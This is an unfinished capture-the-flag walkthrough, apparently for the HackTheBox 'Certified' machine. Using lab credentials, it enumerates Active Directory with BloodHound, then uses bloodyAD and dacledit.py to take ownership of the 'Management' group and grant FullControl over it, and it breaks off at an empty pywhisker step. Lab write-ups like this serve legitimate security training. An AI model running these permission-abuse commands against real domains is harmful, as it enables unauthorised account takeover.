
initaial access with given user: 

```
judith.mader:judith09
```

## Run Bloodhound

```
bloodhound.py -u 'judith.mader' -p 'judith09' -d 'certified.htb' -dc dc01.certified.htb -ns 10.129.73.100 -c all
```

Import data to bloodhound

Judith has writeonwer rights on group "Management"
there for we can add judith as the owner of this group. 

this can be done with bloodyAD

```
bloodyAD --host 10.129.73.100 -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader
```

now we are owner of the group. we can add judith into to groub give her full control rights and then change the password for "management_svc"

```
KRB5CCNAME=judith.mader.ccache dacledit.py -k -no-pass -dc-ip 10.129.73.100 -principal judith.mader -target Management -action write -rights FullControl certified.htb/judith.mader
```

### add j

with the following command we can change the password for management_svc

this is done via pywhisker

```
```